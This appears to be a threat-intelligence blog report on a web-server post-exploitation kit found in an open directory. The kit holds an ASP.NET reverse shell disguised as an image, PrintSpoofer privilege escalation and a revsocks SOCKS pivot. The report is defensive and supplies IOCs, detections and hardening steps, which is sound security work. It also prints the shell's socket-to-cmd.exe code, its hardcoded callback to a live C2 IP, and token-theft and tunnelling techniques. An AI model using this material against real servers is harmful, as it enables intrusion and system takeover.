---
title: 'WebServer Compromise Kit - Technical Analysis & Business Risk Assessment'
date: '2026-02-08'
layout: post
permalink: /reports/webserver-compromise-kit-91-236-230-250/
hide: true
---

## A Comprehensive, Evidence-Based Guide for Security Decision-Makers

**Campaign Identifier:** WebServer-Compromise-Kit-91.236.230.250

**Last Updated:** 2026-02-09

---

# BLUF (Bottom Line Up Front)

## Executive Summary

This report analyzes a sophisticated post-exploitation toolkit discovered on an open directory hosted at `91.236.230.250`. The toolkit represents a complete attack chain for compromising IIS/.NET web servers, escalating privileges to SYSTEM, and establishing persistent network access for lateral movement.

**Key Findings:**

- **Multi-Stage Intrusion Kit:** Three coordinated tools (ASP.NET reverse shell, privilege escalation, network pivoting)
- **Critical Infrastructure:** Open directory at `http://91.236.230.250/` providing public access to complete toolkit
- **Malicious Infrastructure:** Single IP address (91.236.230.250) hosted on BlueVPS AS62005 (United States)

**Threat Assessment:**

This toolkit enables a complete compromise workflow:
1. Initial web server exploitation (reverse shell deployment)
2. Privilege escalation from service account to NT AUTHORITY\SYSTEM
3. Persistent network access and lateral movement capabilities

The presence of an open directory suggests either operational security failure or intentional "public toolkit" distribution for multiple actors. All three tools are legitimate red team utilities repurposed for malicious use, complicating attribution and demonstrating the actor's reliance on proven, publicly available capabilities.

**Defensive Priority:** CRITICAL - Immediate blocking of infrastructure (91.236.230.250) and deployment of detection rules targeting distinctive behavioral patterns (IIS spawning command shells, PrintSpoofer named pipe creation, reverse SOCKS proxy execution).

---

## Table of Contents

1. [Threat Intelligence Context](#threat-intelligence-context)
2. [Technical Analysis](#technical-analysis)
   - [Component 1: ASP.NET Reverse Shell (a.png)](#component-1-aspnet-reverse-shell-apng)
   - [Component 2: PrintSpoofer Privilege Escalation](#component-2-printspoofer-privilege-escalation)
   - [Component 3: revsocks Network Pivot](#component-3-revsocks-network-pivot)
3. [Infrastructure Analysis](#infrastructure-analysis)
4. [Attack Chain Reconstruction](#attack-chain-reconstruction)
5. [Attribution Assessment](#attribution-assessment)
6. [Detection & Hunting](#detection--hunting)
7. [Indicators of Compromise](#indicators-of-compromise)
8. [Mitigation & Response](#mitigation--response)
9. [References & Sources](#references--sources)

---

## Threat Intelligence Context

### Campaign Overview

**Campaign Identifier:** WebServer-Compromise-Kit-91.236.230.250
**Discovery Date:** February 6, 2026
**Infrastructure Status:** Active as of February 8, 2026
**Targeting Pattern:** Opportunistic (any organization running vulnerable IIS/.NET applications)

### Threat Landscape Assessment

**Justification:**
- Multi-tool post-exploitation kit indicating manual, targeted intrusion
- Combination of web shell, privilege escalation, and network pivoting
- Use of legitimate red team tools complicates detection and attribution

**Geographic/Sector Targeting:**
- **Pattern:** Opportunistic web server exploitation
- **Victim Profile:** Any organization running vulnerable IIS/.NET applications
- **Geographic Scope:** Global (no region-specific indicators)

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory91.236.230.250/Hunt.ioOpenDirectory.png" | relative_url }}" alt="Hunt.io Open Directory">
  <figcaption><em>Figure 1: Hunt.io Open Directory</em></figcaption>
</figure>

### Tool Prevalence & Threat Context

**PrintSpoofer:**
- Commonly used privilege escalation tool in post-exploitation scenarios
- Integrated into Metasploit (getsystem -t 5) and available for Cobalt Strike (SpoolSystem CNA)
- Standard tool in penetration testing arsenals

**revsocks:**
- Go-based reverse proxy tool gaining adoption in threat landscape
- Used by penetration testers, red teams, APT groups, and cybercriminals
- Documented in threat intelligence reports (generic usage, not actor-specific)

**InsomniaShell (ASP.NET Web Shell):**
- Common web shell family with multiple variants in circulation
- Used in web server compromises following file-upload vulnerabilities
- Generic C# ASPX shell with numerous forks and variants observed in the wild

**Operational Implications:**

The toolkit's presence suggests the attacker plans:
- **Initial Access:** Web application exploitation (file upload vulnerability, IIS handler misconfiguration, LFI)
- **Privilege Escalation:** From IIS service account to NT AUTHORITY\SYSTEM
- **Lateral Movement:** Internal network reconnaissance and pivoting via SOCKS proxy
- **Persistence:** Reverse proxy provides continuous access mechanism

The reverse proxy capabilities (DNS tunneling, WebSocket encapsulation) indicate the attacker anticipates restrictive network controls and has prepared evasion techniques.

---

## Technical Analysis

### Component 1: ASP.NET Reverse Shell (a.png)

**File Identity:**
- **Filename:** `a.png`
- **True Type:** ASP.NET Web Page (`.aspx`) masquerading as image
- **Language:** C# (ASP.NET)
- **Malware Family:** InsomniaShell (reverse shell variant)
- **SHA-256:** 238a9850787c9336ec56114f346e39088ad63de1c6a1d7d798292a7fb4577738

**Hardcoded Configuration:**
- **C2 IP:** 91.236.230.250
- **C2 Port:** 443/TCP (HTTPS port for firewall evasion)
- **Banner:** "Spawn Shell...\n" (unique network signature)

#### Technical Deep Dive

**Evasion Technique: P/Invoke (Platform Invocation)**

Unlike standard ASP.NET applications that use managed .NET classes like `System.Net.Sockets.TcpClient`, this web shell directly invokes low-level Windows APIs to bypass .NET security controls and evade heuristic scanning.

**Imported Native Libraries:**
- `kernel32.dll`: Process creation, handle management
- `ws2_32.dll`: Low-level networking (Winsock API)
- `advapi32.dll`: Token manipulation

**Execution Flow:**

1. **Trigger:** When `a.png` is requested via HTTP/HTTPS, the `Page_Load` event fires
2. **Configuration:** Sets `host = "91.236.230.250"` and `port = 443`
3. **Connection:** Calls `CallbackShell(host, port)` to establish outbound connection

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory91.236.230.250/ISSreverseshell.png" | relative_url }}" alt="a.png Code in PNG File">
  <figcaption><em>Figure 2: a.png Code in PNG File</em></figcaption>
</figure>

**Network Bridge Mechanism:**

The shell creates a raw Winsock socket, connects to the attacker's C2 server, sends the distinctive "Spawn Shell..." banner, and then spawns a command shell with I/O handles redirected to the network socket.

**I/O Redirection - The Core Mechanism:**

```csharp
STARTUPINFO sInfo = new STARTUPINFO();
sInfo.dwFlags = 0x00000101; // STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW

// CRITICAL: Linking the network socket to process I/O streams
sInfo.hStdInput = oursocket;  // cmd.exe reads commands from network
sInfo.hStdOutput = oursocket; // cmd.exe writes output to network
sInfo.hStdError = oursocket;  // cmd.exe errors go to network

CreateProcess(Application, "", ref pSec, ref pSec, true, 0,
              IntPtr.Zero, null, ref sInfo, out pInfo);

WaitForSingleObject(pInfo.hProcess, INFINITE);
```

**Result:** The attacker receives an interactive `cmd.exe` shell. The `WaitForSingleObject` call blocks the IIS worker thread, maintaining the connection.

**MITRE ATT&CK Mapping:**
- **Initial Access:** T1190 (Exploit Public-Facing Application)
- **Execution:** T1059.003 (Windows Command Shell)
- **Defense Evasion:** T1036.008 (Masquerade File Type)
- **Command & Control:** T1071.001 (Web Protocols)

#### Detection Opportunities

**High-Confidence Network Indicators:**
1. Outbound TCP to 91.236.230.250:443 from `w3wp.exe`
2. TCP payload contains "Spawn Shell..." banner
3. Non-TLS traffic on port 443 (DPI opportunity)

**High-Confidence Host Indicators:**
1. `w3wp.exe` → `cmd.exe` parent-child relationship
2. Image files containing `[DllImport(` strings
3. `w3wp.exe` calling `WSASocket` API

---

### Component 2: PrintSpoofer Privilege Escalation

**File Identity:**
- **Filename:** `PrintSpoofer.exe`
- **Author:** @itm4n (Clément Labro)
- **Source:** github.com/itm4n/PrintSpoofer
- **SHA-256:** 8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d
- **Purpose:** Local Privilege Escalation via SeImpersonatePrivilege abuse

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory91.236.230.250/PrivledgeEscalationtoolPrintSpoofer.png" | relative_url }}" alt="Privledge Escalation tool PrintSpoofer">
  <figcaption><em>Figure 3: Privledge Escalation tool PrintSpoofer</em></figcaption>
</figure>

#### Technique Background

**Mechanism:**

PrintSpoofer exploits the **SeImpersonatePrivilege** commonly granted to service accounts (IIS, SQL Server, Network Service).

**Exploitation Workflow:**

1. Service account has SeImpersonatePrivilege
2. Tool coerces Windows Print Spooler to connect to attacker-controlled Named Pipe
3. Print Spooler runs as NT AUTHORITY\SYSTEM
4. Tool impersonates Spooler's token
5. Escalates to SYSTEM

**MITRE ATT&CK:** T1134.001 (Token Impersonation/Theft)

#### Technical Deep Dive

**Stage 1: Named Pipe Trap**

Creates Named Pipe with format:
```
\\.\pipe\{UUID}\pipe\spoolss
```

**Critical IOC:** The suffix `\pipe\spoolss` is mandatory to bypass Print Spooler's path validation.

**Stage 2: RPC Coercion**

Uses `RpcRemoteFindFirstPrinterChangeNotificationEx` to instruct Print Spooler to connect to the malicious pipe.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory91.236.230.250/conductingRPCcalls.png" | relative_url }}" alt="Code Showing RPC Calls">
  <figcaption><em>Figure 4: Code Showing RPC Calls</em></figcaption>
</figure>

**Stage 3: Token Theft**

1. `ImpersonateNamedPipeClient`: Adopts SYSTEM token
2. `DuplicateTokenEx`: Converts to Primary Token
3. `CreateProcessAsUserW`: Spawns SYSTEM shell

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory91.236.230.250/impersenationextractionandtokenduplication.png" | relative_url }}" alt="Code Showing Token Impersonation">
  <figcaption><em>Figure 5: Code Showing Token Impersonation</em></figcaption>
</figure>

#### Detection Opportunities

**High-Fidelity Indicators:**

1. **Named Pipe Pattern:** `.*\\pipe\\spoolss` created by non-`spoolsv.exe`
2. **Process Lineage:** `w3wp.exe` → `PrintSpoofer.exe` → `cmd.exe` (SYSTEM)
3. **API Sequence:** `ImpersonateNamedPipeClient` + `DuplicateTokenEx` + `CreateProcessAsUserW`

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory91.236.230.250/payloadexecutionwithtoken.png" | relative_url }}" alt="Payload Execution With Token">
  <figcaption><em>Figure 6: Payload Execution With Token</em></figcaption>
</figure>

---

### Component 3: revsocks Network Pivot

**File Identity:**
- **Filename:** `rev.exe`
- **Tool Name:** revsocks v2.8
- **Author:** @kost (Vlatko Kosturjak)
- **SHA-256:** ffc6662c5d68db31b5d468460e4bc3be2090d7ba3ee1e47dbe2803217bf424a9
- **File Size:** 9.3 MB (Go static compilation)
- **Purpose:** Reverse SOCKS5 Proxy

#### Core Function

**Reverse SOCKS5 Proxy:**
- Victim connects outbound to attacker
- Bypasses inbound firewall rules
- Enables lateral movement to internal resources

#### Advanced Evasion Features

**1. DNS Tunneling:**
- Flag: `-dns <domain>`
- Encodes traffic in DNS queries (TXT, NULL, CNAME)
- Evades HTTP-only DLP/proxy controls

**2. WebSocket Encapsulation:**
- Flag: `-ws`
- Wraps TCP in HTTP WebSocket protocol
- Appears as legitimate web traffic

**3. Traffic Multiplexing:**
- Library: `github.com/hashicorp/yamux`
- Breaks beaconing detection

**4. NTLM Authentication:**
- Authenticates through corporate proxies
- Uses stolen domain credentials

#### Detection Opportunities

**High-Confidence Indicators:**

1. **Distinctive User-Agent:**
   ```
   Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
   ```
   (IE11/Win7 - anachronistic for 2026)

2. **Command-Line Flags:** `-connect`, `-dns`, `-socks`, `-pass`

3. **Network Artifacts:**
   - Local SOCKS listener (TCP 1080)
   - Rhythmic DNS queries (200ms interval)
   - WebSocket from non-browser process

---

## Infrastructure Analysis

### Malicious Infrastructure Profile

**Primary C2 Server:**
- **IP:** 91.236.230.250
- **ASN:** AS62005 (BlueVPS OU)
- **Location:** United States (Organization: Estonia)
- **Cost:** $5-15/month
- **Status:** Active (Feb 8, 2026)

**Dual Purpose:**
1. C2 Server (port 443)
2. Malware Distribution (open directory)

### Hosting Provider: BlueVPS OU AS62005

**Abuse Tolerance:** MODERATE-LOW

**VPS hosting provider characteristics:**
- Estonian company (RIPE registry)
- US-based IP infrastructure
- Abuse contact: [email protected]
- Abuse response time: Generally 24-72 hours (varies by case)
- Payment methods include cryptocurrency

**NOT bulletproof hosting** - typically responds to abuse complaints.

**Estimated Infrastructure Lifespan:**
- If reported: Typically 48-96 hours for takedown
- If unreported: May persist for weeks to months

### Infrastructure Pivoting

**Techniques Applied:**
- Passive DNS: No domains found
- SSL Certificates: None
- ASN Enumeration: No related infrastructure
- Clustering: Single-server deployment

---

## Attack Chain Reconstruction

### Kill Chain

**Stage 1: Initial Compromise**
- Web vulnerability exploitation
- `a.png` deployed to IIS webroot

**Stage 2: Initial Access**
- HTTP request to `a.png`
- Reverse shell to 91.236.230.250:443

**Stage 3: Toolkit Download**
- Download PrintSpoofer.exe, rev.exe from open directory

**Stage 4: Privilege Escalation**
- Execute PrintSpoofer
- Obtain SYSTEM shell

**Stage 5: Network Pivoting**
- Execute revsocks
- Establish reverse SOCKS proxy

**Stage 6: Lateral Movement** (hypothetical)
- Internal reconnaissance
- Credential harvesting
- Pivot to high-value targets

---

## Attribution Assessment

### Conclusion

**Threat Actor:** Unknown (Cannot Attribute)
**Confidence:** INSUFFICIENT (<50%)

**Rationale:**
- All tools are public, unmodified
- No infrastructure overlap with known actors
- All TTPs are generic
- No distinctive operational patterns

**Alternative Hypotheses:**
- Low-skill cybercriminal using publicly available tools
- Initial Access Broker staging infrastructure for resale
- Testing or staging infrastructure for planned operations
- Penetration tester with inadequate operational security

**Recommendation:** Treat as generic post-exploitation threat. Focus on technique-based detection.

---

## Detection & Hunting

### Detection Summary

**Complete coverage in:** [Detection Rules & Hunting Queries]({{ "/hunting-detections/webserver-compromise-kit-91-236-230-250-detections" | relative_url }})

**Includes:** YARA, Sigma, Suricata, EDR queries

### Priority Detection Matrix

| Detection | Priority | FP Rate | Stage |
|-----------|----------|---------|-------|
| IIS → cmd.exe | CRITICAL | Very Low | 2 |
| Named Pipe `.*\pipe\spoolss` | CRITICAL | Very Low | 4 |
| Connection to 91.236.230.250 | CRITICAL | None | All |
| "Spawn Shell..." banner | CRITICAL | None | 2 |

### Hunting Queries

**Hunt 1: ASP.NET File Masquerading**
```powershell
Get-ChildItem C:\inetpub\wwwroot -Recurse -Include *.png,*.jpg,*.gif |
    Select-String -Pattern "\[DllImport\(", "Page_Load"
```

**Hunt 2: IIS Network Anomalies**
```kql
DeviceNetworkEvents
| where InitiatingProcessFileName =~ "w3wp.exe"
| where RemoteIPType == "Public"
| summarize by RemoteIP
```

**Hunt 3: PrintSpoofer Pipes**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=17} |
    Where-Object {$_.Properties[2].Value -like "*spoolss"}
```

---

## Indicators of Compromise

### File Hashes

**SHA-256:**
- `8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d` (PrintSpoofer.exe)
- `ffc6662c5d68db31b5d468460e4bc3be2090d7ba3ee1e47dbe2803217bf424a9` (rev.exe)
- `238a9850787c9336ec56114f346e39088ad63de1c6a1d7d798292a7fb4577738` (a.png)

### Network Indicators

**IP Addresses:**
- `91.236.230.250` (C2 + Distribution) - **BLOCK**

**URLs:**
- `http://91.236.230.250/` (open directory)

**User-Agents:**
- `Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko`

### Host Indicators

**File Paths:**
- `C:\inetpub\wwwroot\a.png`
- `C:\Users\Public\Documents\PrintSpoofer.exe`
- `C:\Users\Public\Documents\rev.exe`

**Named Pipes:**
- Pattern: `.*\\pipe\\spoolss`

**Process Trees:**
- `w3wp.exe` → `cmd.exe`
- `w3wp.exe` → `PrintSpoofer.exe` → `cmd.exe` (SYSTEM)

### MITRE ATT&CK

| Tactic | Technique | Evidence |
|--------|-----------|----------|
| Initial Access | T1190 | Web vulnerability |
| Execution | T1059.003 | cmd.exe spawning |
| Privilege Escalation | T1134.001 | PrintSpoofer |
| Defense Evasion | T1036.008 | File masquerading |
| C&C | T1071.001/004 | HTTPS/DNS tunneling |
| C&C | T1090.001 | SOCKS proxy |

**Complete IOC file:** [webserver-compromise-kit-91-236-230-250-iocs.json]({{ "/ioc-feeds/webserver-compromise-kit-91-236-230-250-iocs.json" | relative_url }})

---

## Mitigation & Response

### Immediate Actions

**1. Network Blocking:**
```
Block 91.236.230.250 (all ports)
Add to threat feeds
```

**2. Abuse Reporting:**
```
Email: [email protected]
Include: Malware hashes, screenshots
```

**3. Incident Response:**
- Isolate affected systems
- Terminate malicious processes
- Quarantine files
- Reset credentials
- Preserve forensics

### Long-Term Hardening

**1. Disable Print Spooler:**
```powershell
Stop-Service Spooler
Set-Service Spooler -StartupType Disabled
```

**2. IIS Hardening:**
- Restrict file extensions
- Content inspection for uploads
- Remove dangerous handler mappings

**3. Network Segmentation:**
- DMZ for web servers
- Restrict outbound connections
- Application-aware firewall

**4. Enhanced Monitoring:**
- Sysmon (Event IDs 1, 3, 17, 18)
- Weekly threat hunting
- Baseline IIS behavior

---

## References & Sources

### Tool Repositories

- **PrintSpoofer:** https://github.com/itm4n/PrintSpoofer
- **revsocks:** https://github.com/kost/revsocks
- **InsomniaShell:** Public web shell tutorials

### MITRE ATT&CK

- Framework Version: v14 (October 2023)
- Reference: https://attack.mitre.org/

### Infrastructure

- RIPE NCC (AS62005)
- VirusTotal Relations
- Certificate Transparency (crt.sh)

---

## License
© 2025 Joseph. All rights reserved.
Free to read, but reuse requires written permission.

